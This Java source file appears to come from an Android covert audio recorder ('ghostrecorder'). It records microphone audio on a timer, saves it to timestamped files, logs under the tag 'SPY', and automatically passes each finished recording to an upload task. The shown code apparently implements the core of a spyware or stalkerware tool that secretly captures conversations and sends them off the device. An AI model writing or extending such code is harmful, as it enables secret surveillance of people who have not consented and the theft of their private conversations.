package com.byteshaft.ghostrecorder;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.ContextWrapper;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.util.Log;
import android.view.View;
import android.widget.Toast;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class RecorderHelpers extends ContextWrapper implements
        CustomMediaRecorder.OnNewFileWrittenListener,
        CustomMediaRecorder.OnRecordingStateChangedListener {

    private static CustomMediaRecorder sRecorder;
    private PendingIntent pendingIntent;
    private AlarmManager alarmManager;

    public RecorderHelpers(Context base) {
        super(base);
        sRecorder = CustomMediaRecorder.getInstance();
    }

    void startRecording(int time) {
        if (CustomMediaRecorder.isRecording()) {
            Log.i("SPY", "Recording already in progress");
            return;
        }
        sRecorder.reset();
        sRecorder.setOnNewFileWrittenListener(this);
        sRecorder.setOnRecordingStateChangedListener(this);
        sRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        sRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        sRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        sRecorder.setAudioEncodingBitRate(16000);
        sRecorder.setDuration(time);
        sRecorder.setOutputFile(Environment.getExternalStorageDirectory() + "/" + "Recordings/" + getTimeStamp() + ".aac");

        try {
            sRecorder.prepare();
        } catch (IOException e) {
            e.printStackTrace();
        }
        sRecorder.start();
    }

    static void stopRecording() {
        if (CustomMediaRecorder.isRecording()) {
            sRecorder.stop();
            sRecorder.reset();
            sRecorder.release();
//            cancelAlarm();
            sRecorder = null;
        }
    }

    void createRecordingDirectoryIfNotAlreadyCreated() {
        File recordingsDirectory = new File(Environment.getExternalStorageDirectory() + "/" + "Recordings");
        if (!recordingsDirectory.exists()) {
            recordingsDirectory.mkdir();
        }
    }
    public void startAlarm(Context context) {
        Intent intent = new Intent("com.byteshaft.startAlarm");
        pendingIntent = PendingIntent.getBroadcast(context, 0 , intent, 0);
        alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        int interval = 5000;
        alarmManager.set(AlarmManager.RTC, System.currentTimeMillis() + 5000, pendingIntent);
        Toast.makeText(this, "Alarm Set!", Toast.LENGTH_SHORT).show();
        System.out.println(alarmManager == null);
    }

    public void cancelAlarm() {
        if(alarmManager != null) {
            alarmManager.cancel(pendingIntent);
            Toast.makeText(this, "Alarm canceled!", Toast.LENGTH_SHORT).show();
        }
    }

    private String getTimeStamp() {
        return new SimpleDateFormat("yyyyMMddhhmmss", Locale.US).format(new Date());
    }

    @Override
    public void onNewRecordingCompleted(String path) {
        new UploadRecordingTask().execute(path);
    }

    @Override
    public void onStop(int stopper) {
        switch (stopper) {
            case AppGlobals.STOPPED_AFTER_TIME:
                break;
            case AppGlobals.STOPPED_WITH_DIRECT_CALL:
                break;
            case AppGlobals.SERVER_DIED:
                break;
        }
    }
}
